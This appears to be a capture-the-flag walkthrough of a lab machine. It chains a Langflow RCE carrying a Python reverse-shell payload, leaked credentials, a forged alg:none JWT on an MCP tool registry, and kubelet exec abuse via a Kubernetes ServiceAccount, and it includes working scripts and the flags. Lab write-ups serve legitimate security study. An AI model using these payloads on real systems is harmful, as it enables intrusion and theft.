
---

## 1. Reconnaissance

An initial Nmap scan revealed the following open/filtered services:

```
nmap -sV fireflow.htb

PORT      STATE    SERVICE   VERSION
22/tcp    open     ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
53/tcp    open     domain?
443/tcp   open     ssl/http  nginx
9100/tcp  filtered jetdirect
30000/tcp filtered ndmps
30718/tcp filtered unknown
30951/tcp filtered unknown
31038/tcp filtered unknown
31337/tcp filtered Elite
```

The spread of high, filtered ports (`30000`, `30718`, `30951`, `31038`) is a strong hint of a **Kubernetes NodePort range**, which turned out to be relevant later in the chain.

## 2. Enumeration

Virtual host enumeration uncovered a subdomain, `flow.fireflow.htb`, hosting a **Langflow** instance. The API exposed its version without authentication:

```json
{"version":"1.8.2","main_version":"1.8.2","package":"Langflow"}
```

Langflow 1.8.2 is affected by a known RCE vulnerability that can be triggered by crafting a malicious flow and executing it via the public build endpoint. Exploiting it requires:

- A valid **user/client ID**
- A **public flow ID**

### 2.1 Obtaining a client ID

Self-registration was open, but the account remained in a "pending approval" state. Even so, the registration response leaked a usable `client_id`:

```http
HTTP/1.1 201 Created
...
{"id":"4a9c3b43-b35c-495a-aff3-ad4909d16d86","username":"lexor","is_active":false, ...}
```

### 2.2 Obtaining a public flow ID

Interacting with the LLM agent playground exposed a public flow, retrievable without authentication:

```
GET /api/v1/flows/public_flow/7d84d636-af65-42e4-ac38-26e867052c25 HTTP/1.1
Host: flow.fireflow.htb
Cookie: client_id=c3d199ea-4578-436d-acbc-d9ca52cbc3d0
```

This returned the full flow definition, confirming flow ID `7d84d636-af65-42e4-ac38-26e867052c25`.

## 3. Foothold — Langflow RCE

With a valid `client_id` cookie and a public flow ID, a crafted component was submitted to the flow-build endpoint:

```
POST /api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?event_delivery=direct&log_builds=false
Host: flow.fireflow.htb
Cookie: client_id=c3d199ea-4578-436d-acbc-d9ca52cbc3d0
```

Body (custom component embedding a reverse shell in its `code` field):

```json
{
  "data": {
    "nodes": [
      {
        "id": "Exploit",
        "data": {
          "id": "Exploit",
          "type": "ExploitComp",
          "node": {
            "template": {
              "_type": "Component",
              "code": {
                "type": "code",
                "value": "from langflow.custom.custom_component.component import Component\nfrom langflow.io import Output\nfrom langflow.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name = 'X'\n    outputs = [Output(display_name='O', name='o', method='r')]\n\n    def r(self) -> Data:\n        import socket, subprocess\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect(('10.10.17.186', 4444))\n        p = subprocess.Popen(['/bin/bash', '-i'], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())\n        p.wait()\n        return Data(data={'ok': 1})"
              }
            },
            "outputs": [{ "types": ["Data"], "name": "o", "method": "r" }]
          }
        }
      }
    ],
    "edges": []
  }
}
```

With a listener running, the flow build triggered code execution and returned a shell as `www-data`:

```
$ nc -lvnp 4444
www-data@fireflow:/var/lib/langflow$
```

## 4. User Flag — Credential Exposure via Environment Variables

The Langflow service process leaked sensitive configuration through its environment:

```
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
```

`/etc/passwd` listed a local user, `nightfall`. Password reuse was confirmed:

```
www-data@fireflow:/var/lib/langflow$ su - nightfall
Password: n1ghtm4r3_b4_n1ghtf4ll
$ id
uid=1000(nightfall) gid=1000(nightfall) groups=1000(nightfall)
$ cat user.txt
848813e76e74cedca9675c9b4bce2bb1
```

## 5. Privilege Escalation — Part 1: MCP Tool Registry JWT Forgery

Inside `nightfall`'s home directory, a hidden `.mcp` folder contained a configuration file referencing an internal **MCP (Model Context Protocol) AI Tool Registry**:

```
~/.mcp/config.json
{
  "server": "http://10.129.244.214:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

The service banner confirmed the authentication scheme accepted **both `HS256` and `none`** as valid JWT algorithms — a critical misconfiguration:

```
curl -s http://10.129.244.214:30080/api/v1/version
{"service":"MCP AI Tool Registry","version":"0.1.0",
 "auth":{"type":"JWT","header":"Authorization: Bearer <token>","supported_algorithms":["HS256","none"]},
 "endpoints":["POST /mcp","POST /api/v1/auth","GET /api/v1/tools","POST /api/v1/tools [admin]"]}
```

### 5.1 Low-privilege authentication

```
curl -s -X POST http://10.129.244.214:30080/api/v1/auth \
  -H "Content-Type: application/json" \
  -d '{"username": "langflow-bot", "password": "Langfl0w@mcp2026!"}'
```

Returned a user-scoped token:

```json
{"sub":"langflow-bot","role":"user"}
```

### 5.2 Privilege escalation via `alg:none`

Registering new tools required an `admin` role. Since the server accepts the `none` algorithm, an unsigned admin token could be forged manually:

```bash
# Header: {"alg":"none","typ":"JWT"}
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '='
# -> eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

# Payload: role escalated to admin
echo -n '{"sub":"langflow-bot","role":"admin"}' | base64 | tr '+/' '-_' | tr -d '='
# -> eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ
```

Forged token (empty signature, as required by `alg:none`):

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ.
```

### 5.3 Registering a malicious tool

The forged admin token was accepted to register a new tool backed by arbitrary command execution:

```
curl -s -X POST http://10.129.244.214:30080/api/v1/tools \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ." \
  -H "Content-Type: application/json" \
  -d @payload.json
{"status":"registered","name":"rce"}
```

Invoking the tool through the MCP JSON-RPC endpoint:

```
curl -s -X POST http://localhost:30080/mcp \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ." \
  -d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"RV2","arguments":{"cmd":"id"}}}'
```

A reverse-shell tool yielded code execution inside the MCP server's container:

```
$ nc -lvnp 4444
$ id
uid=1000(mcp) gid=1000(mcp) groups=1000(mcp)
```

## 6. Privilege Escalation — Part 2: Kubernetes ServiceAccount Abuse

The shell landed inside a Kubernetes pod:

```
$ env
HOSTNAME=mcp-server-54464cb475-29ztf
KUBERNETES_SERVICE_HOST=10.43.0.1
MCP_SERVER_SERVICE_HOST=10.43.250.195
MCP_SERVER_SERVICE_PORT=8080
PWD=/app
```

### 6.1 Harvesting the ServiceAccount token

```
$ ls -la /var/run/secrets/kubernetes.io/serviceaccount/
ca.crt  namespace  token
```

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
```

### 6.2 Enumerating RBAC permissions

A `SelfSubjectRulesReview` revealed the ServiceAccount's effective permissions:

```bash
curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -X POST \
  -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"'"$NS"'"}}' \
  https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews
```

Key finding — the ServiceAccount had `get` on `nodes/proxy`:

```json
{
  "resourceRules": [
    {"verbs": ["get"], "apiGroups": [""], "resources": ["nodes/proxy"]},
    {"verbs": ["create"], "apiGroups": ["authorization.k8s.io"], "resources": ["selfsubjectaccessreviews","selfsubjectrulesreviews"]},
    {"verbs": ["create"], "apiGroups": ["authentication.k8s.io"], "resources": ["selfsubjectreviews"]}
  ]
}
```

`nodes/proxy` is a powerful, frequently-overlooked permission: it allows the holder to proxy arbitrary requests directly to a node's **kubelet API** (default port `10250`), bypassing the usual `pods`/`exec` RBAC checks on the API server.

### 6.3 Reaching the kubelet directly

The node's gateway IP (derived from `/proc/net/route`, since neither `ip` nor `kubectl` were available) doubled as the kubelet endpoint:

```bash
curl -sk -H "Authorization: Bearer $TOKEN" https://10.42.1.1:10250/pods
```

This returned the full pod list for **every namespace on the node** — well beyond what the namespaced RBAC rules implied — including pod specs, container images, and `securityContext` blocks.

### 6.4 Identifying a privileged pod

Filtering the dump for `privileged: true` containers:

```bash
curl -sk -H "Authorization: Bearer $TOKEN" https://10.42.1.1:10250/pods \
  | python3 -c "
import json,sys
d=json.load(sys.stdin)
for p in d['items']:
    for c in p['spec']['containers']:
        sc=c.get('securityContext',{})
        if sc.get('privileged'):
            print(p['metadata']['namespace'], p['metadata']['name'], c['name'], sc)
"
```

Result: **`monitoring/prometheus-prometheus-node-exporter-nmntq`**, container `node-exporter`, running with:

```json
{"privileged": true, "runAsUser": 0, "allowPrivilegeEscalation": true}
```

with `hostPID: true`, `hostNetwork: true`, and the node's root filesystem (`/`) mounted at `/host/root`.

### 6.5 Executing commands via kubelet `/exec/`

Although the `SelfSubjectRulesReview` only listed `get` on `nodes/proxy`, the kubelet's `/exec/` WebSocket endpoint — which internally maps to `create` on `nodes/proxy` — was nonetheless reachable, most likely due to an additional RoleBinding not fully reflected in the review output.

The kubelet exec protocol upgrades an HTTPS request to a WebSocket using the `v4.channel.k8s.io` subprotocol — the same mechanism `kubectl exec` relies on:

```python
#!/usr/bin/env python3
import asyncio, ssl, sys, websockets
from urllib.parse import quote

NODE = "10.42.1.1"
NAMESPACE = "monitoring"
POD = "prometheus-prometheus-node-exporter-nmntq"
CONTAINER = "node-exporter"
TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()

async def run_command(command):
    query = "&".join(f"command={quote(word)}" for word in command.split())
    url = f"wss://{NODE}:10250/exec/{NAMESPACE}/{POD}/{CONTAINER}?output=1&error=1&{query}"

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    try:
        async with websockets.connect(
            url, ssl=ctx,
            additional_headers={"Authorization": f"Bearer {TOKEN}"},
            subprotocols=["v4.channel.k8s.io"],
        ) as ws:
            async for msg in ws:
                sys.stdout.buffer.write(msg[1:])
                sys.stdout.flush()
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
    asyncio.run(run_command(cmd))
```

Confirming code execution as root inside the privileged pod:

```
$ python3 exploit.py "id"
uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)
```

### 6.6 Reading the root flag through the hostPath mount

With command execution inside a privileged, root-running container that mounts the node's `/` filesystem at `/host/root`, the host filesystem became directly readable:

```
$ python3 exploit.py "cat host/root/root/root.txt"
57288c6a6a7406e527568a2d480e98b1
```

## 7. Root Flag

```
57288c6a6a7406e527568a2d480e98b1
```
